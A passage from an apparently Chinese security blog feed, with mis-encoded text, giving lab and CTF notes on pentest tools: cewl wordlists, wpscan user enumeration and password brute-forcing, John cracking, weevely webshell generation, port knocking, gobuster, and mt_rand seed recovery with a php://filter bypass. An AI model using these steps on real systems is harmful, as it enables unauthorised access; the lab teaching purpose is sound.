<p> <code>ä¸»è¦è¿˜æ˜¯æ ¹æ®ç½‘ç«™è‡ªèº«çš„å…³é”®è¯ï¼Œç„¶åç”Ÿæˆçš„å­—å…¸ï¼Œæ¯”å¦‚cewlï¼Œflagç­‰ç­‰</code></p>
</blockquote>
<p><strong>è¿™é‡Œä»¥vulnhub dc2ä¸ºä¾‹</strong></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">-wç­‰åŒäº&gt;   <span class="comment">//å†™å…¥</span></span><br><span class="line">-m n       <span class="comment">//è‡³å°‘ç”Ÿæˆçš„é•¿åº¦ä¸ºnï¼Œé»˜è®¤æ˜¯3</span></span><br><span class="line">-d x       <span class="comment">//ç”Ÿæˆæ›´å¤§çš„å­—å…¸ï¼Œé»˜è®¤x=2</span></span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬ç”¨<code>cewl</code>è¯•è¯•ç”Ÿæˆå­—å…¸</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cewl http:<span class="comment">//dc-2/ &gt;pass.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ<code>pass.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> pass.txtï¼ŒæŸ¥çœ‹å†…å®¹</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>å‘ç°æ˜¯ç”Ÿæˆå¯¹åº”ç½‘ç«™çš„å¯†ç å­—å…¸</p>
<h2 id="4ï¼‰wpscan"><a href="#4ï¼‰wpscan" class="headerlink" title="4ï¼‰wpscan"></a>4ï¼‰wpscan</h2><blockquote>
<p><code>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·,å®ƒé‡‡ç”¨Rubyç¼–å†™ èƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´,å…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´</code></p>
</blockquote>
<p><strong>è¿™é‡Œä»¥vulnhub dc2ä¸ºä¾‹</strong></p>
<figure class="highlight qml"><table><tr><td class="code"><pre><span class="line">wpscan -<span class="built_in">url</span> <span class="attribute">http</span>:<span class="comment">//dc-2 -e u</span></span><br><span class="line"></span><br><span class="line">-e u    <span class="comment">//æšä¸¾ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">wpscan -<span class="built_in">url</span> xx -P xx -U xx</span><br><span class="line">-P passwdspath  <span class="comment">//å¯†ç å­—å…¸è·¯å¾„ï¼Œæˆ–è€…ç›´æ¥å†™</span></span><br><span class="line">-U userspath    <span class="comment">//ç”¨æˆ·åå­—å…¸è·¯å¾„ï¼Œæˆ–è€…ç›´æ¥å†™</span></span><br></pre></td></tr></table></figure>



<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹æ€§å¯¹wordpressè¿›è¡Œæ¸—é€çœ‹çœ‹ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">è¾“å…¥wpscan <span class="params">--url</span> http:<span class="string">//dc-2</span> -e u</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>ç„¶åå¾€ä¸‹çœ‹ç”¨æˆ·å</p>
<p><img src="/post/tooluse(Commontools)/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªï¼Œç„¶åå¯ä»¥å¤åˆ¶ä¸‹æ¥ï¼Œå¼„ä¸€ä¸ªç”¨æˆ·åçš„æ–‡æœ¬ï¼Œå’Œä¹‹å‰çš„<code>pass.txt</code>è¿™ä¸ªå¯†ç æœ¬ä¸€æ ·</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">è¾“å…¥vi un.txt,æŠŠadmin <span class="keyword">jerry </span>tomå¤åˆ¶è¿›å»</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>ç„¶åå°±å¯ä»¥ç»“åˆæˆ‘ä»¬çš„å¯†ç æ–‡æœ¬å’Œç”¨æˆ·åæ–‡æœ¬ï¼Œåˆ©ç”¨wpscanè¿™ä¸ªå·¥å…·ï¼Œè¿›è¡Œçˆ†ç ´æ“ä½œäº†</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">è¾“å…¥wpscan <span class="params">--url</span> http:<span class="string">//dc-2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>ç¨å¾®ç­‰ä¸€ä¼š</p>
<p><img src="/post/tooluse(Commontools)/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p>adminç”¨æˆ·å¯†ç æ²¡æœ‰æ‰¾åˆ°ï¼Œåº”è¯¥æ˜¯æœ€é«˜æƒé™çš„è´¦å·</p>
<p>ä½†æ˜¯jerryå’Œtomç”¨æˆ·çš„å¯†ç çŸ¥é“äº†</p>
<h2 id="5ï¼‰John"><a href="#5ï¼‰John" class="headerlink" title="5ï¼‰John"></a>5ï¼‰John</h2><p>Johnæ˜¯ä¸€ä¸ªç ´è§£ç³»ç»Ÿå¯†ç çš„å·¥å…·</p>
<p>ä½¿ç”¨å¾ˆç®€å•</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">john passwd<span class="selector-class">.txt</span> <span class="comment">//è¿™é‡Œæ˜¯ç›´æ¥åˆ©ç”¨johnè‡ªå¸¦çš„å¯†ç æœ¬ï¼Œåé¢æ¥çš„æ˜¯éœ€è¦çˆ†ç ´çš„å¯†ç æ–‡æœ¬æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">john <span class="attr">--wordlist</span>=å­—å…¸è·¯å¾„ passwd<span class="selector-class">.txt</span> <span class="comment">//è¿™é‡Œæ˜¯æŒ‡å®šå¯†ç æœ¬ï¼Œåé¢æ¥çš„æ˜¯éœ€è¦çˆ†ç ´çš„å¯†ç æ–‡æœ¬æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>



<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">john <span class="attr">--show</span> passwd<span class="selector-class">.txt</span> <span class="comment">//è¿™æ˜¯æŸ¥çœ‹è¯¥å¯†ç æ–‡æœ¬ä¸­å·²ç»è¢«çˆ†ç ´æˆåŠŸè¿‡çš„å¯†ç </span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>å°±å¯ä»¥çœ‹åˆ°æ˜æ–‡ä¸º<code>snoopy</code></p>
<h2 id="6ï¼‰weevely"><a href="#6ï¼‰weevely" class="headerlink" title="6ï¼‰weevely"></a>6ï¼‰weevely</h2><blockquote>
<p>Weevelyæ˜¯ä¸€æ¬¾ä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·,é›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«,é‡‡ç”¨c&#x2F;sæ¨¡å¼ æ„å»º,å¯ä»¥ç®—ä½œæ˜¯linuxä¸‹çš„ä¸€æ¬¾phpèœåˆ€æ›¿ä»£å·¥å…·</p>
</blockquote>
<p>ç”ŸæˆShell</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;æ–‡ä»¶å&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure>

<p>æŠŠç”Ÿæˆçš„å†…å®¹ï¼Œå¤åˆ¶åˆ°æˆ‘ä»¬åˆ›å»ºçš„<code>789.php</code>æ–‡ä»¶é‡Œï¼Œå’Œå‰é¢ä¸¤ä¸ªæ–¹æ³•æ­¥éª¤ä¸€æ ·</p>
<p>åˆ©ç”¨è§¦å‘shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>æˆåŠŸè¿›å…¥shell</p>
<h2 id="7ï¼‰whatweb"><a href="#7ï¼‰whatweb" class="headerlink" title="7ï¼‰whatweb"></a>7ï¼‰whatweb</h2><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">whatweb http:<span class="comment">//192.168.220.156/ &gt;&gt; whatweb.txt</span></span><br><span class="line"><span class="comment">//æŠŠç½‘ç«™çš„æ¡†æ¶ä¿¡æ¯å¯¼å…¥åˆ°æ–‡æœ¬whatweb.txtä¸­</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå·¥å…·ä¸»è¦æ˜¯æŸ¥çœ‹ç½‘ç«™çš„æ¡†æ¶ï¼Œå’Œ<code>wapplzer</code>ç±»ä¼¼</p>
<p><img src="/post/tooluse(Commontools)/image-20221103104233193.png" alt="image-20221103104233193"></p>
<h2 id="8ï¼‰knockd"><a href="#8ï¼‰knockd" class="headerlink" title="8ï¼‰knockd"></a>8ï¼‰knockd</h2><blockquote>
<p>åœ¨1920å¹´ä»£ï¼Œå½“ç¦ä»¤å¦‚ç«å¦‚è¼åœ°è¿›è¡Œæ—¶ï¼Œå¦‚æœæ‚¨æƒ³è¿›å…¥è¯´è¯çŠ¶æ€ï¼Œå°±å¿…é¡»çŸ¥é“ç§˜å¯†çš„æ•²é—¨å£°ï¼Œå¹¶æ­£ç¡®åœ°æ•²æ‰“å®ƒæ‰èƒ½è¿›å…¥å†…éƒ¨ã€‚</p>
<p>ç«¯å£æ•²é—¨æ˜¯ç°ä»£çš„ç­‰åŒç‰©ã€‚ å¦‚æœæ‚¨å¸Œæœ›äººä»¬å¯ä»¥è®¿é—®æ‚¨è®¡ç®—æœºä¸Šçš„æœåŠ¡ï¼Œä½†åˆä¸æƒ³å°†é˜²ç«å¢™æ‰“å¼€åˆ°Internetï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç«¯å£æ–­å¼€åŠŸèƒ½ã€‚<br>å®ƒå…è®¸æ‚¨å…³é—­é˜²ç«å¢™ä¸Šå…è®¸ä¼ å…¥è¿æ¥çš„ç«¯å£ï¼Œå¹¶åœ¨è¿›è¡Œé¢„å…ˆå®‰æ’çš„è¿æ¥å°è¯•æ–¹å¼æ—¶è‡ªåŠ¨æ‰“å¼€å®ƒä»¬ã€‚ è¿æ¥å°è¯•çš„é¡ºåºå……å½“ç§˜å¯†æ•²é—¨ã€‚ å¦ä¸€ä¸ªç§˜å¯†çš„æ•²é—¨å£°å…³é—­äº†æ¸¯å£ã€‚</p>
</blockquote>
<p>ä»€ä¹ˆæ„æ€å‘¢ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘å…ˆå…³é—­äº†ä¸€ä¸ªç«¯å£</p>
<p>ä½†æ˜¯å‘¢ï¼Œæˆ‘ä¸ºäº†æˆ‘æƒ³è¦çš„äººè®¿é—®å®ƒï¼Œæˆ‘å†™äº†ä¸€ä¸ª<code>æ•²é—¨çš„é¡ºåºï¼ˆä¹Ÿå°±æ˜¯è®¿é—®ç«¯å£çš„é¡ºåºï¼‰</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">é¡ºåºåœ¨<span class="regexp">/etc/</span>knockd.conf</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚ï¼Œ</p>
<p>æˆ‘å…³é—­äº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">22/sshç«¯å£</span><br></pre></td></tr></table></figure>

<p>æˆ‘å†™äº†ä¸€ä¸ªé¡ºåº</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7893</span>,<span class="number">6452</span>,<span class="number">2412</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸‰ä¸ªç«¯å£</p>
<p>æˆ‘ä¸ºä»€ä¹ˆä¸ºä½ <code>æ‰“å¼€22ç«¯å£</code>ï¼ŒåŸå› æ˜¯å› ä¸ºä½ <code>æ•²å¯¹äº†é¡ºåº</code></p>
<p>è¿™é‡Œå°±æ¶‰åŠ<code>æ•²é—¨çš„æ–¹æ³•</code></p>
<h3 id="1-knockå‘½ä»¤"><a href="#1-knockå‘½ä»¤" class="headerlink" title="1&gt; knockå‘½ä»¤"></a>1&gt; knockå‘½ä»¤</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.1.8</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span> //<span class="number">192.168.1.8</span>ä¸ºç›®æ ‡ip</span><br></pre></td></tr></table></figure>

<h3 id="2-ncå‘½ä»¤"><a href="#2-ncå‘½ä»¤" class="headerlink" title="2&gt;ncå‘½ä»¤"></a>2&gt;ncå‘½ä»¤</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">$ nc -v dc9 <span class="number">7469</span></span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">7469</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">8475</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">8475</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">9842</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">9842</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">ä¹Ÿå°±æ˜¯åˆ©ç”¨ncå‘½ä»¤ä¸‰æ¬¡è®¿é—®è¿™<span class="number">3</span>ä¸ªç«¯å£</span><br></pre></td></tr></table></figure>

<p>æœ€åç”¨<code>nmap</code>æ‰«ä¸€ä¸‹å°±çœ‹è§<code>22</code>ç«¯å£æ‰“å¼€äº†</p>
<h2 id="9-openssl"><a href="#9-openssl" class="headerlink" title="9)openssl"></a>9)openssl</h2><h3 id="SSL-ç®€ä»‹"><a href="#SSL-ç®€ä»‹" class="headerlink" title="SSL ç®€ä»‹"></a>SSL ç®€ä»‹</h3><blockquote>
<p>æŒ‰ç…§æˆ‘çš„ç†è§£æ¥è§£é‡Šä¸‹ï¼Œ</p>
<p>ä¸ºäº†è®©ç½‘ç»œé€šä¿¡æ›´å®‰å…¨ï¼Œéœ€è¦è®¤è¯å’ŒåŠ å¯†ï¼Œè®¤è¯æ˜¯è¯´æ˜ä½ æ˜¯è¦æ‰¾çš„äººï¼ŒåŠ å¯†æ˜¯ä¸ºäº†è®©æˆªè·ä¸­é—´æŠ¥æ–‡ç¬¬ä¸‰è€…æ— æ³•å¾—åˆ°æ¶ˆæ¯å†…å®¹ã€‚</p>
<p>ä¸ºæ­¤æœ‰äººè®¾è®¡äº†SSLï¼Œå³å¥—æ¥å­—ä¸Šçš„å®‰å…¨å±‚ï¼Œç®€å•æ¥è¯´å°±æ˜¯åœ¨TCPä¹‹ä¸Šåšä¸€ä¸ªå®‰å…¨é€šä¿¡å±‚ï¼ŒHTTP on SSL å³æ˜¯HTTPsï¼Œ</p>
<p>ç°åœ¨å‡ ä¹æ‰€æœ‰çš„é“¶è¡Œç½‘ç«™è®¿é—®éƒ½æ˜¯åŸºäºHTTPSåè®®çš„ã€‚<br>è®¤è¯æ˜¯é€šè¿‡è¯ä¹¦+éå¯¹ç§°åŠ å¯†ç®—æ³•æ¥è§£å†³çš„</p>
</blockquote>
<blockquote>
<p>opensslå¯ä»¥å®ç°ï¼šç§˜é’¥è¯ä¹¦ç®¡ç†ã€å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†ã€‚</p>
</blockquote>
<p>ä¸¾ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">openssl passwd -<span class="number">1</span> -salt salt password</span><br><span class="line">==&gt;</span><br><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>ä½¿ç”¨ä»€ä¹ˆå“ˆå¸Œç®—æ³•ã€‚åœ¨æˆ‘ä»¬çš„ç”¨ä¾‹ä¸­ï¼Œè¿™æ— å…³ç´§è¦ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ MD5ï¼Œåœ¨ç°å®ä¸–ç•Œçš„ PT ä¸­åº”è¯¥é¿å…ä½¿ç”¨ MD5ï¼Œå› ä¸ºå®ƒä¸å®‰å…¨ã€‚</span><br><span class="line"></span><br><span class="line">-salt saltç”¨ä½œç›çš„å­—ç¬¦ä¸²ã€‚æˆ‘é€‰æ‹©å­—ç¬¦ä¸²ç›</span><br><span class="line"></span><br><span class="line">passwordæˆ‘ä»¬æƒ³ä½¿ç”¨çš„æ˜æ–‡å¯†ç </span><br></pre></td></tr></table></figure>

<h2 id="10-gobuster"><a href="#10-gobuster" class="headerlink" title="10)gobuster"></a>10)gobuster</h2><h3 id="çˆ†ç ´ç›®å½•"><a href="#çˆ†ç ´ç›®å½•" class="headerlink" title="çˆ†ç ´ç›®å½•"></a>çˆ†ç ´ç›®å½•</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">gobuster</span> dir -w <span class="meta">common</span>.txt -u url</span><br></pre></td></tr></table></figure>

<h3 id="çˆ†ç ´å­åŸŸå"><a href="#çˆ†ç ´å­åŸŸå" class="headerlink" title="çˆ†ç ´å­åŸŸå"></a>çˆ†ç ´å­åŸŸå</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gobuster</span> vhost -w subdomains-top1million-<span class="number">5000</span>.txt -u url</span><br></pre></td></tr></table></figure>

<h2 id="11-seedå·¥å…·php-mt-seed"><a href="#11-seedå·¥å…·php-mt-seed" class="headerlink" title="11)seedå·¥å…·php_mt_seed"></a>11)seedå·¥å…·php_mt_seed</h2><p>è¿™é‡Œä»¥ä¸€é“é¢˜ä¸ºä¾‹å­è®²è§£è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br><span class="line">No Hacker!</span><br></pre></td></tr></table></figure>

<hr>
<p>æœç´¢è¿™ä¸¤ä¸ªå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_scrand</span>()</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>()  </span><br></pre></td></tr></table></figure>

<p><code>mt_scrand(seed)</code>è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘<code>seed</code>ç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé <code>mt_rand()</code>ç”Ÿæˆéšæœºæ•°ã€‚</p>
<p>æˆ‘ä»¬æ¥å†™æ®µä»£ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è®¿é—®ï¼Œè¾“å‡º<code>162946439</code>ã€‚</p>
<p>ç°åœ¨ä»£ç æ”¹ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å†æ¬¡è®¿é—®:</p>
<blockquote>
<p>162946439</p>
<p>247161732</p>
<p>1463094264</p>
<p>1878061366</p>
<p>394962642</p>
</blockquote>
<p>å‘ç°<code>162946439</code>åˆå‡ºç°äº†</p>
<blockquote>
<p>æ‰€ä»¥å¯ä»¥æ¨æ–­å‡ºéšæœºæ•°å…¶å®æ˜¯å¯é¢„æµ‹çš„ï¼Œ</p>
<p>å®ƒä»¥ä¸€ç§çº¿æ€§çš„æ–¹å¼ç”Ÿæˆ</p>
<p>çŸ¥é“ç§å­å’Œä¸€ç»„ä¼ªéšæœºæ•°ä¸æ˜¯å°±å¯ä»¥æ¨y(ä¼ªéšæœºæ•°äº†å—),å½“ç„¶å®é™…ä¸Šæ›´å¤æ‚è‚¯å®šã€‚</p>
<p>æˆ‘çŸ¥é“ç§å­åï¼Œå¯ä»¥ç¡®å®šä½ è¾“å‡ºä¼ªéšæœºæ•°çš„åºåˆ—ã€‚<br>çŸ¥é“ä½ çš„éšæœºæ•°åºåˆ—ï¼Œå¯ä»¥ç¡®å®šä½ çš„ç§å­ã€‚ </p>
</blockquote>
<p>åœ¨æˆ‘ä»¬çš„ä¾‹é¢˜ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“æˆ‘ä»¬çš„ç§å­æ˜¯å¤šå°‘</p>
<p>ä½†æ˜¯å®ƒç»™å‡ºäº†æˆ‘ä»¬ç§å­çš„ç¬¬ä¸€ä¸ªéšæœºæ•°<code>1219893521</code></p>
<p>è¿™ä¸ªæ—¶å€™æƒ³è¦æ‹¿åˆ°ç§å­çš„å€¼ï¼Œå°±éœ€è¦å¤§é‡åå‘çš„æ¼”ç®—æ¨å¯¼äº†</p>
<p>è¿™ä¸ªè¿‡ç¨‹å¾ˆåºå¤§ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨åˆ°äº†å·¥å…·ã€è„šæœ¬ã€‘<code>php_mt_seed</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">time</span> ./php_mt_seed ç¬¬ä¸€ä¸ªéšæœºæ•°  </span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20221120141340099.png" alt="image-20221120141340099"></p>
<p>äºæ˜¯æˆ‘ä»¬å°±å¾—åˆ°äº†æˆ‘ä»¬çš„<code>seed</code></p>
<blockquote>
<p>1145146</p>
</blockquote>
<p>å†åˆ†ææºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåœ¨ echoå¤„å·²ç»éšæœºäº†ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨åº•ä¸‹æ¯”è¾ƒçš„æ—¶å€™å°±ç®—ç¬¬äºŒä¸ªéšæœºæ•°è¿›è¡Œå¼ºç±»å‹æ¯”è¾ƒ</p>
<p>äºæ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="string">&quot;1145146&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line">==&gt;<span class="number">1219893521</span>&lt;br&gt;<span class="number">1202031004</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>guess</code>å‚æ•°çš„å€¼<code>1202031004</code></p>
<p>å¯¹äºæœ€åå¯¹<code>file</code>æ–‡ä»¶åŒ…å«è¯­å¥çš„æ­£åˆ™åŒ¹é…ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚å°±æ˜¯ä¸èƒ½å‡ºç°<code>base</code>ï¼Œç„¶åå‚æ•°ä¸­é—´è¦åŒ…å«<code>/NewStar/</code>è¿™ä¸€æ®µ</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=php:<span class="comment">//filter</span></span><br></pre></td></tr></table></figure>

<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmapä½¿ç”¨æ€»ç»“</title>
    <url>//post/tooluse(sqlmap)/</url>
    <content><![CDATA[<blockquote>
<p><code>åŸæ–‡ä½œè€…: Ywc</code></p>
<p><code>åŸæ–‡é“¾æ¥: https://yinwc.github.io/2018/07/05/tooluse(sqlmap)/</code></p>
<p><code>å‘è¡¨æ—¥æœŸ: July 5th 2018, 1:20:40 pm</code></p>
<p><code>ç‰ˆæƒå£°æ˜:</code></p>
</blockquote>
<span id="more"></span>

